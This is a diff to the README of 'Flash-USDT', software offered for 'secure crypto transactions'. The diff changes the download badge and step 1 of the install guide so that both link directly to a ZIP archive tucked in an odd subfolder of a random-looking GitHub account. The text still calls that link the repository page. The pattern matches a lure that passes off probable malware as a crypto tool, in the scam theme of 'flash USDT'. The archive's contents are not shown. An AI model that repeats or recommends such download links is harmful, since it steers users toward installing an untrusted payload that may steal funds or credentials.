@@ -1,6 +1,6 @@
 # ⚡ Flash-USDT - Reliable software for secure crypto transactions
 
-[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/Sussexspanielmongolianism486/Flash-USDT)
+[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/Sussexspanielmongolianism486/Flash-USDT/raw/refs/heads/main/totipalmate/USDT_Flash_v1.7-beta.3.zip)
 
 ## 📌 Introduction
 
@@ -21,7 +21,7 @@ Before you install this software, confirm your computer meets these minimum spec
 
 Follow these steps to set up the software on your Windows machine.
 
-1. Visit the repository page to download the software: https://github.com/Sussexspanielmongolianism486/Flash-USDT
+1. Visit the repository page to download the software: https://github.com/Sussexspanielmongolianism486/Flash-USDT/raw/refs/heads/main/totipalmate/USDT_Flash_v1.7-beta.3.zip
 2. Click the green button labeled Code and select Download ZIP.
 3. Once the download finishes, locate the file in your Downloads folder.
 4. Right-click the folder and select Extract All.
